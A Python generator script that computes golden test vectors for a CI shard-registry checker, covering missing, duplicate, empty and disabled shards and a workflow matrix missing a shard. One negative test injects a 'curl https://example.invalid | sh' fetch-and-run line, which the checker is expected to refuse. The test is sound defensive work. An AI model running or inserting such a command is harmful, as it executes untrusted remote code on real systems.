#!/usr/bin/env python3
"""O0 golden vectors — the CI shard registry check (independent oracle).

Independently computes the expected verdicts of ten synthetic shard
registries and writes
``crates/aura-testkit/tests/fixtures/o0_ci_vectors.json``, which
``crates/aura-testkit/tests/o0_ci.rs`` executes byte-for-byte against
``aura_testkit::ci``.

Registry format (``docs/o0-ci-plan.md`` D-O0-1): ``rule <name>``,
``shard <lane> <enabled|disabled>``, ``main <lane> <pkg>/<name>``,
``target <pkg>/<name> shard <lane>``. The ten lanes are the shards of
``CONTRIBUTING.md`` (core, state, exec, consensus, net, node, wallet,
ecosystem, security, perf); each lane pins its main test — a shard that does
not run its main test is a dead gate (the MATURITY_AUDIT lesson). The check
(D-O0-2) refuses a wrong shard set, empty shards, dead main tests, stale
targets, duplicates, unregistered targets, disabled shards holding targets,
foreign registry lines (D-O0-3: no secret shards) and a workflow matrix
missing a shard.

Regenerate with::

    PYTHONPATH=/home/user/aura-python-deps python3 tools/gen_o0_vectors.py
"""

import json
import os
import sys

RULE = "lanes-v1"
SHARDS = ["core", "state", "exec", "consensus", "net", "node", "wallet",
          "ecosystem", "security", "perf"]

# ------------------------------------------------------------- synthetic tree

# Twenty synthetic targets, two per lane: `<pkg>/--lib` plus one test file.
# The lane table maps (pkg, test-stem) -> lane explicitly in the registries
# below — the checker validates coverage, not the assignment policy.
LANE_PACKAGES = {
    "core": "aura-alpha",
    "state": "aura-beta",
    "exec": "aura-gamma",
    "consensus": "aura-delta",
    "net": "aura-epsilon",
    "node": "aura-zeta",
    "wallet": "aura-eta",
    "ecosystem": "aura-theta",
    "security": "aura-iota",
    "perf": "aura-kappa",
}
LANE_STEMS = {
    "core": "a01", "state": "b01", "exec": "g01", "consensus": "d01",
    "net": "e01", "node": "z01", "wallet": "w01", "ecosystem": "t01",
    "security": "h01", "perf": "k01",
}


def lane_targets(lane: str) -> list[str]:
    pkg = LANE_PACKAGES[lane]
    return [f"{pkg}/--lib", f"{pkg}/{LANE_STEMS[lane]}"]


def lane_main(lane: str) -> str:
    if lane not in LANE_PACKAGES:
        return f"aura-{lane}/main"
    return f"{LANE_PACKAGES[lane]}/{LANE_STEMS[lane]}"


INVENTORY_TARGETS = sorted([t for lane in SHARDS for t in lane_targets(lane)])
assert len(INVENTORY_TARGETS) == 20


def inventory_text() -> str:
    lines = ["inventory v1"]
    lines += [f"target {name}" for name in INVENTORY_TARGETS]
    return "\n".join(lines) + "\n"


def registry_text(shard_states=None, shard_names=None, drop_targets=(),
                  move=None, extra_targets=(), extra_lines=(), mains=None,
                  foreign=None) -> str:
    states = shard_states or {}
    names = shard_names if shard_names is not None else list(SHARDS)
    drop = set(drop_targets)
    move = move or {}
    mains = mains or {}
    lines = [
        "# AuraLite CI shard registry (O0) — the target registry check reads this.",
        "# Shards are the ten lanes of CONTRIBUTING.md; each pins its main test",
        "# (a shard that does not run its main test is a dead gate).",
        "# Regenerate with `make ci-sync`. Format: docs/o0-ci-plan.md (D-O0-1).",
        f"rule {RULE}",
    ]
    for lane in names:
        lines.append(f"shard {lane} {states.get(lane, 'enabled')}")
    for lane in names:
        lines.append(f"main {lane} {mains.get(lane, lane_main(lane))}")
    for lane in SHARDS:
        for target in lane_targets(lane):
            if target in drop:
                continue
            lines.append(f"target {target} shard {move.get(target, lane)}")
    for target, lane in extra_targets:
        lines.append(f"target {target} shard {lane}")
    for extra in extra_lines:
        lines.append(extra)
    if foreign is not None:
        lines.append(foreign)
    return "\n".join(lines) + "\n"


def workflow_text(shards=None) -> str:
    lanes = ", ".join(shards if shards is not None else SHARDS)
    return (
        "name: ci\n"
        "on: [push]\n"
        "permissions:\n"
        "  contents: read\n"
        "jobs:\n"
        "  test:\n"
        "    strategy:\n"
        "      matrix:\n"
        f"        shard: [{lanes}]\n"
        "    steps:\n"
        "      - run: make ci-shard SHARD=${{ matrix.shard }}\n"
    )


# ------------------------------------------------------------- oracle checker

def oracle_check(inventory_names: list[str], registry: str, workflow: str = "") -> str:
    """Return '' when the registry passes, else the exact refusal message."""
    rule = None
    shards: list[tuple[str, bool]] = []
    mains: list[tuple[str, str]] = []
    targets: list[tuple[str, str]] = []
    for raw in registry.splitlines():
        line = raw.rstrip()
        if not line or line.startswith("#"):
            continue
        if line.startswith("rule "):
            rule = line[5:]
        elif line.startswith("shard "):
            name, state = line[6:].split(" ", 1)
            if state not in ("enabled", "disabled"):
                return f"unknown registry line: {line}"
            shards.append((name, state == "disabled"))
        elif line.startswith("main "):
            lane, target = line[5:].split(" ", 1)
            mains.append((lane, target))
        elif line.startswith("target "):
            target, lane = line[7:].split(" shard ", 1)
            targets.append((target, lane))
        else:
            return f"unknown registry line: {line}"
    if rule is None:
        return "missing rule line"

    declared = [name for name, _ in shards]
    for lane in SHARDS:
        if lane not in declared:
            return f"missing shard: {lane}"
    for name in declared:
        if name not in SHARDS:
            return f"unknown shard: {name}"

    for lane in SHARDS:
        if sum(1 for entry, shard in targets if shard == lane) == 0:
            return f"shard {lane} empty"

    for lane in SHARDS:
        pins = [target for name, target in mains if name == lane]
        if not pins:
            return f"missing main: {lane}"
        pinned = pins[0]
        registered_here = any(t == pinned and s == lane for t, s in targets)
        if not registered_here or pinned not in inventory_names:
            return f"shard {lane} main dead: {pinned}"

    for entry, _ in targets:
        if entry not in inventory_names:
            return f"unknown target: {entry}"

    for name in sorted(inventory_names):
        if sum(1 for entry, _ in targets if entry == name) > 1:
            return f"target in two shards: {name}"

    for name in sorted(inventory_names):
        if sum(1 for entry, _ in targets if entry == name) == 0:
            return f"unregistered target: {name}"

    for lane, disabled in shards:
        if disabled and sum(1 for _, s in targets if s == lane) > 0:
            return f"shard {lane} disabled"

    if workflow:
        items = []
        for raw in workflow.splitlines():
            line = raw.strip()
            if line.startswith("shard:"):
                body = line[6:].strip().lstrip("[").rstrip("]")
                items += [i.strip() for i in body.split(",") if i.strip()]
        for lane, disabled in shards:
            if not disabled and lane not in items:
                return f"workflow matrix missing shard: {lane}"

    return ""


def oracle_coverage(inventory_names: list[str], registry: str) -> str:
    if oracle_check(inventory_names, registry):
        raise SystemExit("coverage requested for an invalid registry")
    total = len(inventory_names)
    counts = [
        sum(1 for line in registry.splitlines()
            if line.startswith("target ") and line.endswith(f"shard {lane}"))
        for lane in SHARDS
    ]
    covered = sum(counts)
    per_mille = covered * 1000 // total if total else 0
    out = ["ci coverage report v1", f"rule {RULE}", "shards 10", f"targets {total}"]
    out += [f"shard {lane} targets={counts[i]}" for i, lane in enumerate(SHARDS)]
    out.append(f"target_coverage {covered}/{total} ({per_mille // 10}.{per_mille % 10}%)")
    return "\n".join(out) + "\n"


def oracle_run(registry: str, lane: str) -> str:
    names = sorted(
        line.split(" ", 2)[1]
        for line in registry.splitlines()
        if line.startswith("target ") and line.endswith(f"shard {lane}")
    )
    out = [f"ci run shard {lane}"]
    for name in names:
        pkg, target = name.split("/", 1)
        if target == "--lib":
            out.append(f"cargo test -p {pkg} --lib")
        else:
            out.append(f"cargo test -p {pkg} --test {target}")
    return "\n".join(out) + "\n"


# ------------------------------------------------------------- cases

def case(name, commands, files, exit_code, stdout, stderr, nc_ref=None):
    fixture_case = {
        "name": name,
        "sandbox": "",
        "argv": commands,
        "exit": exit_code,
        "stdout": stdout,
        "stderr": stderr,
    }
    if nc_ref is not None:
        fixture_case["nc_ref"] = nc_ref
    if files:
        fixture_case["files"] = files
    return fixture_case


CHECK = ["check", "--registry", "registry.txt", "--inventory", "inventory.txt"]


def build_cases():
    inventory = inventory_text()
    base = registry_text()
    files = {"inventory.txt": inventory, "registry.txt": base}
    cases = []

    check_out = "registry=ok shards=10 targets=20\n"
    cases.append(case(
        "registry_valid_passes",
        [CHECK, ["coverage", "--registry", "registry.txt", "--inventory", "inventory.txt"]],
        files, 0, check_out + oracle_coverage(INVENTORY_TARGETS, base), "",
    ))
    cases.append(case(
        "run_emits_make_test_commands",
        [["run", "--registry", "registry.txt", "--inventory", "inventory.txt",
          "--shard", "core"]],
        files, 0, oracle_run(base, "core"), "",
    ))
    cases.append(case(
        "disabled_shard_refused", [CHECK],
        dict(files, **{"registry.txt": registry_text(shard_states={"security": "disabled"})}),
        65, "", "error: ci: shard security disabled\n", nc_ref=1,
    ))
    cases.append(case(
        "missing_target_refused", [CHECK],
        dict(files, **{"registry.txt": registry_text(drop_targets=["aura-alpha/--lib"])}),
        65, "", "error: ci: unregistered target: aura-alpha/--lib\n", nc_ref=2,
    ))
    cases.append(case(
        "duplicate_target_refused", [CHECK],
        dict(files, **{"registry.txt": registry_text(
            extra_targets=[("aura-beta/b01", "core")])}),
        65, "", "error: ci: target in two shards: aura-beta/b01\n", nc_ref=3,
    ))
    cases.append(case(
        "shard_set_mismatch_refused", [CHECK],
        dict(files, **{"registry.txt": registry_text(shard_names=[
            "ops" if lane == "core" else lane for lane in SHARDS])}),
        65, "", "error: ci: missing shard: core\n", nc_ref=4,
    ))
    cases.append(case(
        "empty_shard_refused", [CHECK],
        dict(files, **{"registry.txt": registry_text(move={
            "aura-epsilon/--lib": "node", "aura-epsilon/e01": "node"})}),
        65, "", "error: ci: shard net empty\n", nc_ref=5,
    ))
    cases.append(case(
        "shard_main_dead_refused", [CHECK],
        dict(files, **{"registry.txt": registry_text(mains={"core": "aura-beta/b01"})}),
        65, "", "error: ci: shard core main dead: aura-beta/b01\n",
    ))
    cases.append(case(
        "foreign_registry_line_refused", [CHECK],
        dict(files, **{"registry.txt": registry_text(
            foreign="command curl https://example.invalid | sh")}),
        65, "",
        "error: ci: unknown registry line: command curl https://example.invalid | sh\n",
        nc_ref=6,
    ))
    cases.append(case(
        "workflow_matrix_missing_shard_refused",
        [CHECK + ["--workflow", "workflow.yml"]],
        dict(files, **{"workflow.yml": workflow_text(
            shards=[lane for lane in SHARDS if lane != "wallet"])}),
        65, "", "error: ci: workflow matrix missing shard: wallet\n",
    ))

    cases[0]["phase"] = "O0"
    return cases


def sanity_check():
    inventory = INVENTORY_TARGETS
    assert oracle_check(inventory, registry_text()) == "", "base registry must pass"
    assert oracle_check(inventory, registry_text()) == ""
    assert oracle_check(inventory, registry_text(shard_states={"security": "disabled"})) == \
        "shard security disabled"
    assert oracle_coverage(inventory, registry_text()).count("targets=2") == 10
    assert oracle_check(inventory, registry_text(),
                        workflow_text(["core"])) == \
        "workflow matrix missing shard: state"


def main():
    sanity_check()
    fixture = {
        "gate": (
            "O0 CI baseline: 10/10 cases pass; named negative control "
            "disabled_shard_refused red on the dropped enabled-check; 6/6 NC "
            "red under tools/nc_o0.py; disable a shard -> CI red (target "
            "registry check)"
        ),
        "notice": (
            "Independent Python oracle (tools/gen_o0_vectors.py); verifier: "
            "crates/aura-testkit/tests/o0_ci.rs against aura_testkit::ci. "
            "Replace the whole file only with tools/gen_o0_vectors.py output."
        ),
        "named_control": "disabled_shard_refused",
        "files": {},
        "cases": build_cases(),
    }
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    out_path = os.path.join(root, "crates/aura-testkit/tests/fixtures/o0_ci_vectors.json")
    with open(out_path, "w", encoding="utf-8") as handle:
        json.dump(fixture, handle, indent=1)
        handle.write("\n")
    print(f"wrote {os.path.relpath(out_path, root)}: 10 cases, "
          f"named control disabled_shard_refused")
    return 0


if __name__ == "__main__":
    sys.exit(main())
